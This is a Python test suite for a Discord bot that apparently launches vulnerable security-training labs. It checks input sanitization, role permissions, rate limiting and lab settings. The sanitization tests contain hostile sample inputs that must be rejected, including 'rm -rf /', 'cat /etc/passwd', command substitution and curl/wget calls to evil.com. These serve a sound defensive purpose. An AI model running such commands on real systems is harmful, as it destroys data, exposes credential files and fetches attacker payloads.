#!/usr/bin/env python3
"""
Test suite for Bagley orchestrator and security modules
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config.security import sanitize_input, check_role, BLOCKED_PATTERNS, ALLOWED_ROLES
from config.settings import AVAILABLE_LABS, MAX_LABS_PER_USER
from discord_bot.utils import RateLimiter


# ── Security Tests ──────────────────────────────────────────────

def test_sanitize_clean_input():
    """Test that clean input passes sanitization"""
    valid, cleaned = sanitize_input("dvwa")
    assert valid is True
    assert cleaned == "dvwa"
    print("✅ test_sanitize_clean_input passed")


def test_sanitize_blocks_command_substitution():
    """Test blocking of $() command substitution"""
    valid, msg = sanitize_input("$(whoami)")
    assert valid is False
    assert "Invalid input" in msg
    print("✅ test_sanitize_blocks_command_substitution passed")


def test_sanitize_blocks_backticks():
    """Test blocking of backtick execution"""
    valid, msg = sanitize_input("`ls -la`")
    assert valid is False
    assert "Invalid input" in msg
    print("✅ test_sanitize_blocks_backticks passed")


def test_sanitize_blocks_command_chaining():
    """Test blocking of && and || operators"""
    valid, msg = sanitize_input("dvwa && rm -rf /")
    assert valid is False
    assert "Invalid input" in msg

    valid, msg = sanitize_input("dvwa || cat /etc/passwd")
    assert valid is False
    assert "Invalid input" in msg
    print("✅ test_sanitize_blocks_command_chaining passed")


def test_sanitize_blocks_curl_wget():
    """Test blocking of external fetching commands"""
    valid, msg = sanitize_input("curl http://evil.com")
    assert valid is False

    valid, msg = sanitize_input("wget http://evil.com")
    assert valid is False
    print("✅ test_sanitize_blocks_curl_wget passed")


def test_sanitize_blocks_eval_exec():
    """Test blocking of eval/exec"""
    valid, msg = sanitize_input("eval('malicious')")
    assert valid is False

    valid, msg = sanitize_input("exec('malicious')")
    assert valid is False
    print("✅ test_sanitize_blocks_eval_exec passed")


def test_sanitize_blocks_urls():
    """Test blocking of URL schemes"""
    valid, msg = sanitize_input("http://evil.com/payload")
    assert valid is False

    valid, msg = sanitize_input("https://evil.com/payload")
    assert valid is False
    print("✅ test_sanitize_blocks_urls passed")


def test_sanitize_strips_whitespace():
    """Test that whitespace is stripped"""
    valid, cleaned = sanitize_input("  dvwa  ")
    assert valid is True
    assert cleaned == "dvwa"
    print("✅ test_sanitize_strips_whitespace passed")


# ── Role Tests ──────────────────────────────────────────────────

def test_check_role_verified():
    """Test that verified-member role is accepted"""
    assert check_role(["verified-member"]) is True
    print("✅ test_check_role_verified passed")


def test_check_role_admin():
    """Test that admin role is accepted"""
    assert check_role(["admin"]) is True
    print("✅ test_check_role_admin passed")


def test_check_role_officers():
    """Test that officers role is accepted"""
    assert check_role(["officers"]) is True
    print("✅ test_check_role_officers passed")


def test_check_role_denied():
    """Test that unverified users are denied"""
    assert check_role(["everyone"]) is False
    assert check_role([]) is False
    print("✅ test_check_role_denied passed")


# ── Rate Limiter Tests ──────────────────────────────────────────

def test_rate_limiter_allows_normal():
    """Test that normal usage is allowed"""
    limiter = RateLimiter(soft_limit=10, warn_limit=15, hard_limit=20)
    for _ in range(9):
        allowed, msg = limiter.check_limit("test_user")
        assert allowed is True
        assert msg is None
    print("✅ test_rate_limiter_allows_normal passed")


def test_rate_limiter_warns():
    """Test that warning is shown at warn limit"""
    limiter = RateLimiter(soft_limit=3, warn_limit=6, hard_limit=10)
    # Fill up to soft limit
    for _ in range(3):
        limiter.check_limit("test_user")
    # Next should warn
    allowed, msg = limiter.check_limit("test_user")
    assert allowed is True
    assert msg is not None
    assert "slow down" in msg
    print("✅ test_rate_limiter_warns passed")


def test_rate_limiter_blocks():
    """Test that hard limit blocks"""
    limiter = RateLimiter(soft_limit=2, warn_limit=3, hard_limit=5)
    # Fill up to hard limit
    for _ in range(5):
        limiter.check_limit("test_user")
    # Next should block
    allowed, msg = limiter.check_limit("test_user")
    assert allowed is False
    assert "Too many" in msg
    print("✅ test_rate_limiter_blocks passed")


# ── Settings Tests ──────────────────────────────────────────────

def test_available_labs():
    """Test that all expected labs are configured"""
    assert "dvwa" in AVAILABLE_LABS
    assert "webgoat" in AVAILABLE_LABS
    assert "juice-shop" in AVAILABLE_LABS
    assert "metasploitable" in AVAILABLE_LABS
    print("✅ test_available_labs passed")


def test_lab_config_fields():
    """Test that lab configs have required fields"""
    required = ["name", "image", "category", "difficulty", "description", "port"]
    for lab_type, config in AVAILABLE_LABS.items():
        for field in required:
            assert field in config, f"{lab_type} missing {field}"
    print("✅ test_lab_config_fields passed")


def test_max_labs_default():
    """Test default max labs per user"""
    assert MAX_LABS_PER_USER == 3
    print("✅ test_max_labs_default passed")


# ── Runner ──────────────────────────────────────────────────────

def run_all_tests():
    """Run all tests"""
    tests = [
        # Security
        test_sanitize_clean_input,
        test_sanitize_blocks_command_substitution,
        test_sanitize_blocks_backticks,
        test_sanitize_blocks_command_chaining,
        test_sanitize_blocks_curl_wget,
        test_sanitize_blocks_eval_exec,
        test_sanitize_blocks_urls,
        test_sanitize_strips_whitespace,
        # Roles
        test_check_role_verified,
        test_check_role_admin,
        test_check_role_officers,
        test_check_role_denied,
        # Rate limiter
        test_rate_limiter_allows_normal,
        test_rate_limiter_warns,
        test_rate_limiter_blocks,
        # Settings
        test_available_labs,
        test_lab_config_fields,
        test_max_labs_default,
    ]

    print("🧪 Running Bagley orchestrator & security tests...\n")
    failed = 0

    for test in tests:
        try:
            test()
        except AssertionError as e:
            print(f"❌ {test.__name__} failed: {e}")
            failed += 1
        except Exception as e:
            print(f"❌ {test.__name__} error: {e}")
            failed += 1

    print(f"\n{'='*50}")
    if failed == 0:
        print(f"🎉 All {len(tests)} tests passed!")
        return 0
    else:
        print(f"💥 {failed}/{len(tests)} test(s) failed")
        return 1


if __name__ == "__main__":
    sys.exit(run_all_tests())
